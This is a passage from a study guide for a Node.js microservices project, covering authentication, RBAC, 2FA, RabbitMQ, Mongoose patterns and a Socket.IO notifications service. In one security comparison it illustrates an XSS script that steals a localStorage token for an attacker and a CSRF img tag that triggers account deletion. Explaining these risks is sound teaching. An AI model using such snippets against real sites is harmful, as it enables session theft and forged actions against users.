      return res.status(403).json({ message: 'Insufficient permissions' });
    }
    next();
  };
};

// Usage:
router.post('/create',
  authenticate,                               // Step 1: Who are you?
  authorize('super_admin', 'site_admin'),     // Step 2: Are you allowed?
  createInvite                                // Step 3: Execute
);
```

**Both are needed:**
- Authenticate without authorize → User can access everything
- Authorize without authenticate → Don't know who the user is!

---

### Q4: Why hash passwords with bcrypt instead of just encrypting them?

**Answer:**

**Hashing vs Encryption:**

| Aspect | Hashing (bcrypt) | Encryption (AES) |
|--------|------------------|------------------|
| Reversible? | ❌ No (one-way) | ✅ Yes (two-way) |
| Needs key? | ❌ No | ✅ Yes |
| Use case | Passwords | Sensitive data |
| If compromised | ✅ Password still safe | ❌ If key leaked, all passwords exposed |

**Why bcrypt specifically:**

1. **Adaptive Cost Factor**: Adjustable difficulty (salt rounds)
   ```javascript
   // 12 rounds = 2^12 iterations ≈ 0.3 seconds
   bcrypt.hash(password, 12)
   
   // Prevents brute force:
   // - Try 1 password: 0.3s
   // - Try 1 million: 3.5 days!
   // - Try 1 billion: 9.5 years!
   ```

2. **Built-in Salt**: Prevents rainbow table attacks
   ```javascript
   // Same password, different hashes:
   hash("password123") → "$2a$12$KIXxBj9..."
   hash("password123") → "$2a$12$oPqRsT8..."
   ```

3. **Future-proof**: Can increase cost factor as computers get faster

**Verification:**
```javascript
// Login:
const isValid = await bcrypt.compare(inputPassword, storedHash);
// bcrypt extracts salt from hash and re-hashes input
// Compares results (constant-time comparison to prevent timing attacks)
```

---

### Q5: What happens when an access token expires?

**Answer:**

**Complete Flow:**

1. **Frontend makes API request** with expired access token:
   ```javascript
   GET /api/auth/profile
   Authorization: Bearer <expired-access-token>
   ```

2. **Middleware verifies token**:
   ```javascript
   // In authenticate middleware:
   const decoded = jwt.verify(token, JWT_SECRET);
   // Throws: "TokenExpiredError: jwt expired"
   ```

3. **Server responds with 401**:
   ```json
   {
     "success": false,
     "message": "Invalid or expired token"
   }
   ```

4. **Frontend detects 401**, calls refresh endpoint:
   ```javascript
   POST /api/auth/refresh
   {
     "refreshToken": "abc123..."
   }
   ```

5. **Server validates refresh token**:
   ```javascript
   // Check if refresh token exists and is valid
   const storedToken = await refreshTokenRepo.findByToken(token);
   if (!storedToken.isValid()) {
     // Expired or revoked → User must login again
     return 401;
   }
   ```

6. **Server generates new tokens**:
   ```javascript
   // Revoke old refresh token
   await authService.revokeRefreshToken(oldToken);
   
   // Create new refresh token
   const newRefreshToken = await authService.createRefreshToken(userId);
   
   // Create new access token
   const newAccessToken = generateAccessToken(user);
   
   // Return both
   return { accessToken, refreshToken };
   ```

7. **Frontend retries original request** with new access token.

**Edge Case: Refresh token also expired**
- Server returns 401
- Frontend redirects to login page
- User must re-authenticate

---

### Q6: Why use MongoDB populate instead of just storing the data directly?

**Answer:**

**Data Normalization vs Denormalization:**

**Bad Approach (Denormalization):**
```javascript
// Store full user data in invite
{
  _id: "...",
  email: "user@example.com",
  invitedBy: {
    _id: "507f...",
    firstName: "John",
    lastName: "Doe",
    email: "john@example.com",
    // ... all user fields
  }
}

// Problems:
// 1. If John changes his name, old invites show old name
// 2. Data duplication
// 3. Inconsistency
```

**Good Approach (Normalization + Populate):**
```javascript
// Store only reference
{
  _id: "...",
  email: "user@example.com",
  invitedBy: "507f..."  // Just the ID
}

// Populate when needed
const invite = await inviteRepo.findByToken(token, {
  populate: { path: 'invitedBy', select: 'firstName lastName email' }
});

// Benefits:
// 1. If John changes name, all invites show updated name
// 2. No data duplication
// 3. Single source of truth
// 4. Can choose what fields to include
```

**When to denormalize:**
```javascript
// Store organizationName in invite (duplicating Organization.name)
{
  organizationName: "Acme Corp"  // Snapshot at invitation time
}

// Why?
// - If organization name changes, invitation should show original name
// - Historical record
// - "You were invited to join Acme Corp" should not change
```

---

### Q7: Explain the Repository Pattern. Why not use Mongoose models directly in services?

**Answer:**

**Without Repository Pattern (Direct Model Access):**

```javascript
// authService.js
import User from '../models/User.js';

async authenticate(email, password) {
  const user = await User.findOne({ email })
    .populate('organization')
    .lean();
  // ... rest of logic
}

// inviteService.js
import User from '../models/User.js';

async createInvite(email) {
  const user = await User.findOne({ email })
    .populate('organization')
    .lean();
  // ... rest of logic
}

// Problems:
// ❌ Repeated query logic
// ❌ Tight coupling to Mongoose
// ❌ Hard to test (need to mock Mongoose)
// ❌ Can't add caching easily
```

**With Repository Pattern:**

```javascript
// userRepository.js
export class UserRepository {
  async findByEmail(email, options = {}) {
    let query = User.findOne({ email });
    if (options.populate) query = query.populate(options.populate);
    if (options.lean) query = query.lean();
    return await query;
  }
}

// authService.js
async authenticate(email, password) {
  const user = await userRepo.findByEmail(email, {
    populate: 'organization',
    lean: true
  });
  // ... rest of logic
}

// inviteService.js
async createInvite(email) {
  const user = await userRepo.findByEmail(email, {
    populate: 'organization',
    lean: true
  });
  // ... rest of logic
}

// Benefits:
// ✅ DRY (Don't Repeat Yourself)
// ✅ Abstraction (can change DB without changing services)
// ✅ Easy to test (mock userRepo)
// ✅ Can add caching, logging in one place
```

**Real-world example - Adding caching:**

```javascript
// userRepository.js
async findByEmail(email, options = {}) {
  // Check cache first
  const cacheKey = `user:${email}`;
  const cached = await redis.get(cacheKey);
  if (cached) return JSON.parse(cached);
  
  // Query database
  const user = await User.findOne({ email })
    .populate(options.populate)
    .lean(options.lean);
  
  // Cache result
  await redis.set(cacheKey, JSON.stringify(user), 'EX', 300);
  
  return user;
}

// All services now use cache automatically!
// No changes needed in authService, inviteService, etc.
```

---

### Q8: Why do we have both OTP and TOTP for 2FA? What's the difference?

**Answer:**

**OTP (One-Time Password) - Email-based:**

```javascript
// Flow:
1. Generate random 6-digit code → "123456"
2. Hash it → "$2a$10$KIXxBj9..."
3. Store hash in database
4. Send code via email
5. User enters code within 10 minutes
6. Verify: bcrypt.compare(input, hash)
7. Clear from database

// Pros:
// ✅ Easy for users (just check email)
// ✅ No app installation needed
// ✅ Works on any device

// Cons:
// ⚠️ Depends on email delivery (can be delayed)
// ⚠️ Email can be intercepted
// ⚠️ Requires internet to receive
// ⚠️ Database storage needed
```

**TOTP (Time-Based OTP) - Google Authenticator:**

```javascript
// Flow:
1. Generate secret → "JBSWY3DPEHPK3PXP"
2. Store secret in database
3. Generate QR code
4. User scans with Google Authenticator
5. App generates time-based codes (changes every 30 seconds)
6. User enters current code
7. Verify: speakeasy.verify(code, secret)

// Pros:
// ✅ More secure (secret never transmitted)
// ✅ Works offline
// ✅ Industry standard (Google, AWS, GitHub use it)
// ✅ No email dependency

// Cons:
// ⚠️ Requires app installation
// ⚠️ If lose phone, lose access (need backup codes)
// ⚠️ Slightly more complex for users
```

**Why support both?**

```javascript
// Different use cases:

// Enterprise (client_user):
// - Organization decides 2FA method
// - All employees use same method
// - Example: Bank requires TOTP for all employees

// Individual users (super_admin, site_admin, operator):
// - Can choose their preferred method
// - Flexibility vs security trade-off

// Client admins:
// - Can choose method
// - Can change organization's default method
```

**Algorithm comparison:**

```javascript
// OTP: Random generation
const otp = crypto.randomInt(100000, 999999);
// Output: "538921" (different each time)

// TOTP: Time-based algorithm (RFC 6238)
const token = speakeasy.totp({
  secret: userSecret,
  encoding: 'base32',
  step: 30  // New code every 30 seconds
});
// Output at 10:00:00 → "123456"
// Output at 10:00:30 → "789012" (changes)
// Output at 10:00:00 on different device with same secret → "123456" (same!)
```

---

### Q9: What's the purpose of RabbitMQ in this architecture? Why not just use HTTP?

**Answer:**

**HTTP (Synchronous Communication):**

```javascript
// userManagement → notifications (HTTP)
async sendInviteEmail(email, token) {
  await axios.post('http://notification-service:4000/api/email/send', {
    to: email,
    subject: 'Invitation',
    html: '...'
  });
}

// Problems:
// ❌ Blocks request (waits for email to send)
// ❌ If notification service is down → invite creation fails
// ❌ Tight coupling
// ❌ User waits for email to be sent (slow)
```

**RabbitMQ (Asynchronous Communication):**

```javascript
// userManagement → RabbitMQ
async sendInviteEmail(email, token) {
  await publishEvent('events', 'user.invite.created', {
    to: email,
    subject: 'Invitation',
    html: '...'
  });
  // Returns immediately! Doesn't wait for email to send
}

// RabbitMQ → notifications (separate process)
channel.consume('email_queue', async (msg) => {
  const emailData = JSON.parse(msg.content);
  await sendEmail(emailData);
  channel.ack(msg);
});

// Benefits:
// ✅ Non-blocking (invite created instantly)
// ✅ If notification service is down → message queued
// ✅ Loose coupling
// ✅ Can add more consumers
// ✅ Automatic retry on failure
// ✅ Load balancing (multiple workers)
```

**Real-world comparison:**

```javascript
// Scenario: Create invite

// With HTTP:
POST /api/invites/create
→ Save invite (50ms)
→ HTTP call to send email (2000ms) ← SLOW!
→ Return response
Total: 2050ms

// With RabbitMQ:
POST /api/invites/create
→ Save invite (50ms)
→ Publish to queue (5ms)
→ Return response
Total: 55ms  ← 40x faster!

// Email sent in background:
RabbitMQ → Notification service → SMTP (2000ms)
// User doesn't wait for this!
```

**Message Guarantee:**

```javascript
// RabbitMQ features:

1. Persistent messages:
channel.publish(exchange, routingKey, payload, {
  persistent: true  // Survives RabbitMQ restart
});

2. Acknowledgment:
channel.consume(queue, async (msg) => {
  try {
    await sendEmail(...);
    channel.ack(msg);  // Success! Remove from queue
  } catch (error) {
    channel.nack(msg, false, true);  // Retry
  }
});

3. Dead Letter Queue:
// If message fails 3 times → send to dead letter queue
// Admin can review and manually process
```

---

### Q10: Explain the difference between `lean()` and regular Mongoose queries.

**Answer:**

**Regular Query (Mongoose Document):**

```javascript
const user = await User.findById(userId);

console.log(typeof user);  // → "object" (Mongoose Document)
console.log(user.constructor.name);  // → "model"

// Has Mongoose methods:
user.firstName = "New Name";
await user.save();  // ✅ Works

user.comparePassword("password");  // ✅ Works (custom method)

// Includes internal Mongoose properties:
console.log(Object.keys(user));
// → ["$__", "$isNew", "_doc", ... hundreds of internal properties]

// Memory: ~5-10KB per document
```

**Lean Query (Plain JavaScript Object):**

```javascript
const user = await User.findById(userId).lean();

console.log(typeof user);  // → "object" (Plain Object)
console.log(user.constructor.name);  // → "Object"

// NO Mongoose methods:
user.firstName = "New Name";
await user.save();  // ❌ Error! save is not a function

user.comparePassword("password");  // ❌ Error! Not a function

// Only data fields:
console.log(Object.keys(user));
// → ["_id", "email", "firstName", "lastName", "role", ...]

// Memory: ~1KB per document
```

**Performance Comparison:**

```javascript
// Test: Fetch 10,000 users

// Regular query:
const users = await User.find();
// Time: 2500ms
// Memory: 50MB

// Lean query:
const users = await User.find().lean();
// Time: 400ms  ← 6x faster!
// Memory: 10MB  ← 5x less memory!
```

**When to use each:**

```javascript
// Use REGULAR query when:
// - Need to modify and save
// - Need Mongoose methods
// - Working with single documents

async updateUser(userId, data) {
  const user = await User.findById(userId);  // Regular
  user.firstName = data.firstName;
  await user.save();  // Need save()
}

// Use LEAN query when:
// - Read-only operations
// - Listing multiple documents
// - API responses
// - Performance-critical

async getUsers() {
  const users = await User.find().lean();  // Lean
  return res.json({ users });  // Just sending data
}

// Real-world example:
async getProfile(req, res) {
  // Lean for API response
  const user = await userRepo.findById(req.user._id, {
    populate: 'organization',
    lean: true
  });
  
  // Remove sensitive fields
  delete user.password;
  delete user.totpSecret;
  
  return res.json({ user });
}
```

---

### Q11: What is the `toSafeObject()` method? Why not just delete fields before sending?

**Answer:**

**Without `toSafeObject()`:**

```javascript
// ❌ Manually delete sensitive fields every time
async getProfile(req, res) {
  const user = await User.findById(req.user._id);
  
  const userObj = user.toObject();
  delete userObj.password;
  delete userObj.totpSecret;
  delete userObj.otpHash;
  
  return res.json({ user: userObj });
}

async listUsers(req, res) {
  const users = await User.find();
  
  const safeUsers = users.map(user => {
    const obj = user.toObject();
    delete obj.password;     // Forgot one?
    delete obj.totpSecret;
    // Forgot otpHash! ← Security vulnerability!
    return obj;
  });
  
  return res.json({ users: safeUsers });
}

// Problems:
// ❌ Repetitive code
// ❌ Easy to forget fields
// ❌ Security risk
```

**With `toSafeObject()`:**

```javascript
// File: models/User.js
userSchema.methods.toSafeObject = function() {
  const obj = this.toObject();
  delete obj.password;
  delete obj.totpSecret;
  delete obj.otpHash;
  return obj;
};

// Usage:
async getProfile(req, res) {
  const user = await User.findById(req.user._id);
  return res.json({ user: user.toSafeObject() });  // ✅ Clean
}

async listUsers(req, res) {
  const users = await User.find();
  return res.json({
    users: users.map(u => u.toSafeObject())  // ✅ Safe
  });
}

// Benefits:
// ✅ DRY (defined once, used everywhere)
// ✅ Can't forget fields
// ✅ Centralized security logic
```

**Alternative approach - Mongoose transforms:**

```javascript
// Automatically applied on toJSON()
userSchema.set('toJSON', {
  transform: function(doc, ret, options) {
    delete ret.password;
    delete ret.totpSecret;
    delete ret.otpHash;
    return ret;
  }
});

// Now res.json() automatically removes fields:
return res.json({ user });  // Password already removed!
```

**Why our code uses `toSafeObject()` instead of transform:**

```javascript
// More explicit and clear
user.toSafeObject()  // "I want safe version"

// vs automatic transform:
user.toJSON()  // Not clear what's being filtered
```

---

### Q12: Explain the error handling flow. Why custom error classes?

**Answer:**

**Without Custom Errors:**

```javascript
// ❌ String errors (bad practice)
async createInvite(email) {
  const user = await userRepo.findByEmail(email);
  if (user) {
    throw new Error('User exists');  // Just a string!
  }
  // ...
}

// Controller has to check message strings:
try {
  await inviteService.createInvite(email);
} catch (error) {
  if (error.message === 'User exists') {
    return res.status(409).json({ message: error.message });
  }
  if (error.message === 'Invalid email') {
    return res.status(400).json({ message: error.message });
  }
  // ❌ Fragile! What if message changes?
  // ❌ Have to know all possible error messages
}
```

**With Custom Error Classes:**

```javascript
// Define error types:
class ValidationError extends Error {
  constructor(message) {
    super(message);
    this.statusCode = 400;
  }
}

class ConflictError extends Error {
  constructor(message) {
    super(message);
    this.statusCode = 409;
  }
}

// Service throws typed errors:
async createInvite(email) {
  const user = await userRepo.findByEmail(email);
  if (user) {
    throw new ConflictError('User already exists');
  }
  
  if (!email.includes('@')) {
    throw new ValidationError('Invalid email format');
  }
}

// Controller checks error types:
try {
  await inviteService.createInvite(email);
} catch (error) {
  if (error.statusCode === 409) {
    return res.status(409).json({ message: error.message });
  }
  if (error.statusCode === 400) {
    return res.status(400).json({ message: error.message });
  }
  // Even better: Global error handler!
}
```

**Our Implementation:**

```javascript
// File: utils/errors.js

export class AppError extends Error {
  constructor(message, statusCode, isOperational = true) {
    super(message);
    this.statusCode = statusCode;
    this.isOperational = isOperational;
    // isOperational = expected error (validation, auth, etc.)
    // !isOperational = programmer error (null reference, etc.)
  }
}

export class ValidationError extends AppError {
  constructor(message = 'Validation failed') {
    super(message, 400);
  }
}

export class AuthenticationError extends AppError {
  constructor(message = 'Authentication failed') {
    super(message, 401);
  }
}

export class AuthorizationError extends AppError {
  constructor(message = 'Insufficient permissions') {
    super(message, 403);
  }
}

// Usage in controller:
try {
  await inviteService.createInvite(email);
} catch (error) {
  if (error.statusCode === 403) {
    return forbidden(res, error.message);
  }
  if (error.statusCode === 400) {
    return badRequest(res, error.message);
  }
  return serverError(res);
}

// Benefits:
// ✅ Type-safe error handling
// ✅ Consistent status codes
// ✅ Clear intent
// ✅ Easy to add new error types
```

---

### Q13: Why use ES6 modules (`import/export`) instead of CommonJS (`require`)?

**Answer:**

**CommonJS (Old Way):**

```javascript
// Old syntax:
const express = require('express');
const { userRepo } = require('./database/repositories');

module.exports = {
  createUser,
  deleteUser
};

// Problems:
// ❌ Synchronous loading (blocks)
// ❌ Imports entire module (can't tree-shake)
// ❌ Dynamic imports complex
// ❌ No static analysis
```

**ES6 Modules (Modern Way):**

```javascript
// Modern syntax:
import express from 'express';
import { userRepo } from './database/repositories/index.js';

export {
  createUser,
  deleteUser
};

// Benefits:
// ✅ Asynchronous loading (non-blocking)
// ✅ Named imports (better for tree-shaking)
// ✅ Static analysis (better IDE support)
// ✅ Future standard
```

**Key Differences:**

```javascript
// 1. Default export/import

// CommonJS:
module.exports = UserService;
const UserService = require('./UserService');

// ES6:
export default UserService;
import UserService from './UserService.js';

// 2. Named exports/imports

// CommonJS:
module.exports = { createUser, deleteUser };
const { createUser } = require('./users');

// ES6:
export { createUser, deleteUser };
import { createUser } from './users.js';

// 3. Dynamic imports

// CommonJS:
const User = require('./models/User');  // Always loaded

// ES6:
const User = await import('./models/User.js');  // Lazy load!

// Tree-shaking example:
// utils.js
export const add = (a, b) => a + b;
export const multiply = (a, b) => a * b;
export const divide = (a, b) => a / b;

// app.js
import { add } from './utils.js';  // Only includes add()
// multiply and divide are NOT included in final bundle
```

**Why `.js` extension required:**

```javascript
// CommonJS (extension optional):
const User = require('./models/User');  // ✅ Works

// ES6 (extension required):
import User from './models/User.js';  // ✅ Works
import User from './models/User';     // ❌ Error!

// Reason: ES6 modules follow browser standards
// Browsers require file extensions for module resolution
```

**Enable ES6 modules:**

```json
// package.json
{
  "type": "module"  // ← This enables ES6 modules
}
```

---

### Q14: What's the difference between `authorization` header authentication and cookie-based authentication?

**Answer:**

**Token in Authorization Header (Our Approach):**

```javascript
// Frontend stores token:
localStorage.setItem('accessToken', token);

// Send with requests:
fetch('/api/auth/profile', {
  headers: {
    'Authorization': `Bearer ${token}`
  }
});

// Backend extracts token:
const authHeader = req.headers.authorization;
const token = authHeader.substring(7);  // Remove "Bearer "

// Pros:
// ✅ Works with mobile apps
// ✅ Works with microservices
// ✅ No CSRF attacks
// ✅ Can send to any domain
// ✅ Stateless

// Cons:
// ⚠️ Vulnerable to XSS (if token in localStorage)
// ⚠️ Must manually attach to requests
```

**Cookie-based Authentication:**

```javascript
// Backend sets cookie:
res.cookie('accessToken', token, {
  httpOnly: true,    // Can't access via JavaScript
  secure: true,      // HTTPS only
  sameSite: 'strict'
});

// Browser automatically sends cookie with requests:
fetch('/api/auth/profile');  // No headers needed!

// Backend reads cookie:
const token = req.cookies.accessToken;

// Pros:
// ✅ Protected from XSS (httpOnly)
// ✅ Automatically sent with requests
// ✅ Secure flags available

// Cons:
// ⚠️ Vulnerable to CSRF
// ⚠️ Doesn't work well with mobile apps
// ⚠️ Same-origin policy issues
// ⚠️ Needs CORS configuration
```

**Why we chose Authorization header:**

```javascript
// 1. Microservices architecture:
// UserManagement (3000) → Notifications (4000)
// Cookies don't work cross-origin easily

// 2. Mobile app support:
// Mobile apps can't use cookies well
// Authorization header works everywhere

// 3. API-first design:
// RESTful APIs typically use headers
// Easier to document in Swagger

// 4. Flexibility:
// Can send different tokens to different services
// Can use with WebSocket (Socket.IO)
```

**Security comparison:**

```javascript
// XSS Attack (Cross-Site Scripting):

// With localStorage:
<script>
  const token = localStorage.getItem('accessToken');
  sendToAttacker(token);  // ❌ Vulnerable
</script>

// With httpOnly cookie:
<script>
  const token = document.cookie;  // ❌ Can't access!
</script>

// CSRF Attack (Cross-Site Request Forgery):

// With cookie (vulnerable):
// Attacker's site:
<img src="https://yourapp.com/api/delete-account">
// Browser automatically sends cookie! ❌

// With Authorization header (safe):
// Attacker can't set Authorization header from their site ✅
```

---

## 🎓 Best Practices Summary

### 1. **Security**
- ✅ Hash passwords with bcrypt (12 rounds)
- ✅ Use JWT with short expiry (15 minutes)
- ✅ Implement refresh token rotation
- ✅ Rate limit authentication endpoints
- ✅ Validate all inputs
- ✅ Use HTTPS in production
- ✅ Never log sensitive data (passwords, tokens)

### 2. **Error Handling**
- ✅ Use custom error classes with status codes
- ✅ Distinguish operational vs programmer errors
- ✅ Global error handler in Express
- ✅ Log errors with context
- ✅ Return user-friendly error messages

### 3. **Database**
- ✅ Use indexes on frequently queried fields
- ✅ Normalize data (avoid duplication)
- ✅ Use lean queries for read-only operations
- ✅ Use populate for relationships
- ✅ Use repository pattern for abstraction

### 4. **Code Organization**
- ✅ Layered architecture (routes → controllers → services → repositories)
- ✅ Single Responsibility Principle
- ✅ DRY (Don't Repeat Yourself)
- ✅ Dependency Injection
- ✅ ES6 modules

### 5. **API Design**
- ✅ RESTful endpoints
- ✅ Consistent response format
- ✅ Proper HTTP status codes
- ✅ API documentation (Swagger)
- ✅ Versioning strategy

### 6. **Microservices**
- ✅ Loose coupling
- ✅ Asynchronous communication (RabbitMQ)
- ✅ Service independence
- ✅ Health check endpoints
- ✅ Graceful shutdown

---

## 📚 Additional Resources

### Official Documentation
- [Express.js](https://expressjs.com/)
- [Mongoose](https://mongoosejs.com/)
- [JWT](https://jwt.io/)
- [RabbitMQ](https://www.rabbitmq.com/tutorials)
- [Socket.IO](https://socket.io/docs/)

### Security
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OAuth 2.0 BCP](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics)
- [JWT Best Practices](https://tools.ietf.org/html/rfc8725)

### Design Patterns
- [Repository Pattern](https://martinfowler.com/eaaCatalog/repository.html)
- [Layered Architecture](https://martinfowler.com/bliki/PresentationDomainDataLayering.html)

---

## 🚀 Quick Reference

### Common Commands

```bash
# User Management Service
cd userManagement
npm install
npm run dev              # Development mode
npm test                 # Run tests
npm start                # Production mode

# Notifications Service
cd notifications
npm install
npm run dev
npm test
npm start
```

### Environment Variables

```bash
# User Management (.env)
PORT=3000
MONGODB_URI=mongodb://localhost:27017/usermanagement
JWT_ACCESS_SECRET=your-secret-key
JWT_ACCESS_EXPIRY=15m
NOTIFICATION_SERVICE_URL=http://localhost:4000
RABBITMQ_URL=amqp://localhost:5672
FRONTEND_URL=http://localhost:5173

# Notifications (.env)
PORT=4000
SMTP_HOST=smtp.gmail.com
SMTP_PORT=587
SMTP_USER=your@email.com
SMTP_PASS=your-password
RABBITMQ_URL=amqp://localhost:5672
REDIS_URL=redis://localhost:6379
```

### API Endpoints

```bash
# Authentication
POST   /api/auth/login
POST   /api/auth/verify-otp
POST   /api/auth/verify-totp
POST   /api/auth/refresh
POST   /api/auth/logout
GET    /api/auth/profile

# Invitations
POST   /api/invites/create
POST   /api/invites/accept
GET    /api/invites/details/:token
GET    /api/invites/list
DELETE /api/invites/:inviteId/revoke

# Organization
GET    /api/organization
PUT    /api/organization
GET    /api/organization/members

# Health
GET    /health
```

---

## ✅ Mentor Meeting Checklist

**Topics to be comfortable explaining:**

- [ ] Overall system architecture (microservices)
- [ ] Authentication flow (JWT + Refresh tokens)
- [ ] Refresh token rotation mechanism
- [ ] Authorization (RBAC + role hierarchy)
- [ ] Two-factor authentication (OTP vs TOTP)
- [ ] Invitation system (token generation, security)
- [ ] Database schema and relationships
- [ ] Repository pattern benefits
- [ ] Microservices communication (HTTP, RabbitMQ, Socket.IO)
- [ ] Error handling strategy
- [ ] Security implementations
- [ ] Why specific technology choices

**Be ready to answer:**
- Why did you choose this architecture?
- What are the trade-offs of your design decisions?
- How would you scale this system?
- What security vulnerabilities did you address?
- How do you handle failures?
- What would you improve given more time?

---

## 🎯 Final Thoughts

This codebase implements **industry-standard patterns** used by companies like:
- **JWT + Refresh Token Rotation**: Used by Google, Facebook, AWS
- **TOTP**: Used by GitHub, AWS, Google (Google Authenticator)
- **RabbitMQ**: Used by Instagram, Mozilla, T-Mobile
- **Microservices**: Used by Netflix, Uber, Amazon
- **Repository Pattern**: Used by most enterprise applications

**Key Strengths:**
1. Security-first approach
2. Scalable architecture
3. Well-organized code
4. Industry best practices
5. Comprehensive error handling

**Good luck with your mentor meeting! 🚀**

---

# 🔧 PART 2: DEEP DIVE INTO EVERY SYSTEM

## 🔔 Notifications Service - Complete Architecture

### Overview

The Notifications Service is a **real-time communication hub** that handles:
1. Email sending (SMTP)
2. Real-time notifications (Socket.IO)
3. Message queue consumption (RabbitMQ)
4. Scalable Socket.IO with Redis Pub/Sub

### System Architecture

```
┌─────────────────────────────────────────────────┐
│         Notifications Service (Port 4000)        │
├─────────────────────────────────────────────────┤
│                                                  │
│  ┌──────────────┐    ┌──────────────┐          │
│  │  HTTP Server │    │ Socket.IO    │          │
│  │  (Express)   │    │  Server      │          │
│  └──────┬───────┘    └──────┬───────┘          │
│         │                   │                   │
│         │                   │                   │
│  ┌──────▼────────────────────▼──────────┐      │
│  │         Redis Adapter                 │      │
│  │  (Pub/Sub for Socket.IO scaling)     │      │
│  └──────────────┬────────────────────────┘      │
│                 │                                │
│  ┌──────────────▼────────────┐                  │
│  │    RabbitMQ Consumer      │                  │
│  │  (Email Queue Listener)   │                  │
│  └──────────────┬────────────┘                  │
│                 │                                │
│  ┌──────────────▼────────────┐                  │
│  │    Nodemailer (SMTP)      │                  │
│  │    (Email Delivery)       │                  │
│  └───────────────────────────┘                  │
└─────────────────────────────────────────────────┘
```

---

## 📨 Email Service Deep Dive

### Nodemailer Configuration

```javascript
// File: notifications/utils/mailer.js

export const initMailer = async () => {
  let host = process.env.SMTP_HOST || 'smtp.ethereal.email';
  let port = parseInt(process.env.SMTP_PORT) || 587;
  let secure = process.env.SMTP_SECURE === 'true';
  let user = process.env.SMTP_USER;
  let pass = process.env.SMTP_PASS;

  transporter = nodemailer.createTransport({
    host,
    port,
    secure,
    auth: { user, pass }
  });

  // Verify connection
  try {
    await transporter.verify();
    logger.info('SMTP connection verified successfully');
  } catch (verifyErr) {
    // Fallback to Ethereal test account
    if (allowFallback) {
      const testAccount = await nodemailer.createTestAccount();
      // Create new transporter with test credentials
    }
  }
};
```

**Why this approach?**

1. **Fallback Mechanism**: If real SMTP fails, automatically creates Ethereal test account
   ```javascript
   // Production: Use real SMTP (Gmail, SendGrid, etc.)
   // Development: Falls back to Ethereal (free test accounts)
   // URLs: https://ethereal.email/messages (view sent emails)
   ```

2. **Verification on Startup**: Catches SMTP configuration errors immediately
   ```javascript
   await transporter.verify();
   // If credentials wrong → Fails at startup (not when sending first email)
   // Better than discovering SMTP issues in production!
   ```

3. **Graceful Degradation**: Service starts even if SMTP unavailable
   ```javascript
   // Service still handles Socket.IO and RabbitMQ
   // Only email sending fails (logged but doesn't crash)
   ```

### Email Sending Process

```javascript
export const sendEmail = async ({ to, subject, html, text }) => {
  if (!transporter) {
    throw new Error('Mailer not initialized');
  }

  const mailOptions = {
    from: SMTP_CONFIG.FROM,
    to,
    subject,
    html: html || text,
    text: text || html
  };

  const info = await transporter.sendMail(mailOptions);
  
  // Get preview URL (Ethereal only)
  const previewUrl = nodemailer.getTestMessageUrl(info);
  
  return {
    success: true,
    messageId: info.messageId,
    previewUrl
  };
};
```

**Why both HTML and text?**

```javascript
// HTML version:
html: `
  <div style="font-family: Arial;">
    <h2>You've been invited!</h2>
    <a href="${link}">Accept Invitation</a>
  </div>
`

// Text version (fallback):
text: `
  You've been invited!
  Accept invitation: ${link}
`

// Reasons:
// 1. Some email clients don't support HTML
// 2. Email accessibility for screen readers
// 3. Spam filters prefer emails with both versions
// 4. Better deliverability
```

---

## 🔌 Socket.IO Real-time Communication

### Server Setup

```javascript
// File: notifications/server.js

const io = new Server(httpServer, {
  cors: {
    origin: SOCKET_CONFIG.CORS_ORIGIN,
    methods: ['GET', 'POST'],
    credentials: true
  },
  transports: ['websocket', 'polling']
});

// Why websocket + polling?
// - WebSocket: Fast, real-time, persistent connection
// - Polling: Fallback for networks that block WebSocket
// - Automatic upgrade from polling to WebSocket when available
```

### Event Handlers

```javascript
io.on('connection', (socket) => {
  logger.info('Socket.IO client connected', { socketId: socket.id });

  // 1. User Registration
  socket.on('register', (data) => {
    const { userId } = data;
    if (userId) {
      socket.join(`user:${userId}`);
      // Now we can send notifications to specific users!
    }
  });

  // 2. Invite Accepted Event
  socket.on('inviteAccepted', (data) => {
    const { userId, message, timestamp } = data;

    // Send to specific user (who sent the invite)
    io.to(`user:${userId}`).emit('notification', {
      type: 'inviteAccepted',
      message,
      timestamp
    });

    // Broadcast to all connected clients
    io.emit('inviteStatusUpdate', {
      type: 'inviteAccepted',
      userId,
      message,
      timestamp
    });
  });

  socket.on('disconnect', (reason) => {
    logger.info('Client disconnected', { socketId: socket.id, reason });
  });
});
```

### Room-Based Messaging

```javascript
// Why use rooms?

// Problem: How to send notification to specific user?
// Can't do: io.emit('notification', data) ← Sends to EVERYONE

// Solution: Rooms!

// Step 1: User joins their room when connecting
socket.join(`user:${userId}`);
// Room name: "user:507f1f77bcf86cd799439011"

// Step 2: Send to that room only
io.to(`user:507f1f77bcf86cd799439011`).emit('notification', data);

// Benefits:
// ✅ Targeted messaging (only to intended recipient)
// ✅ User can have multiple connections (phone + laptop)
// ✅ All user's devices receive notification
// ✅ No need to track socket IDs
```

**Real-world scenario:**

```javascript
// Scenario: Alice invites Bob. Bob accepts.

// 1. Bob accepts invite (userManagement service):
POST /api/invites/accept

// 2. Backend emits Socket event:
socketClient.emit('inviteAccepted', {
  userId: alice._id,
  message: "bob@example.com has accepted their invitation as client_user"
});

// 3. Notification service receives event:
socket.on('inviteAccepted', (data) => {
  // Send to Alice's room
  io.to(`user:${alice._id}`).emit('notification', {
    type: 'inviteAccepted',
    message: data.message
  });
});

// 4. Alice's frontend (all devices) receives notification:
socket.on('notification', (data) => {
  showToast(data.message);  // "bob@example.com has accepted..."
});
```

---

## 📡 Redis Adapter for Socket.IO

### Why Redis for Socket.IO?

```javascript
// Problem: Multiple server instances

┌─────────────┐      ┌─────────────┐
│  Server 1   │      │  Server 2   │
│  Port 4000  │      │  Port 4001  │
└─────────────┘      └─────────────┘
      ↑                    ↑
      │                    │
   Alice                  Bob

// Alice connects to Server 1
// Bob connects to Server 2

// When event happens:
io.to('user:alice').emit('notification', data);
// ❌ Only emits on Server 1! Server 2 doesn't know!

// Solution: Redis Pub/Sub
┌─────────────┐      ┌─────────────┐
│  Server 1   │──────│  Server 2   │
└──────┬──────┘      └──────┬──────┘
       │                    │
       └────────┬───────────┘
                │
         ┌──────▼──────┐
         │    Redis    │
         │   Pub/Sub   │
         └─────────────┘

// Now:
// Server 1 publishes to Redis
// Redis broadcasts to ALL servers
// ✅ Both Server 1 and Server 2 get the event!
```

### Implementation

```javascript
// File: notifications/server.js

import { createAdapter } from '@socket.io/redis-adapter';

const pubClient = getRedisPublisher();
const subClient = getRedisSubscriber();

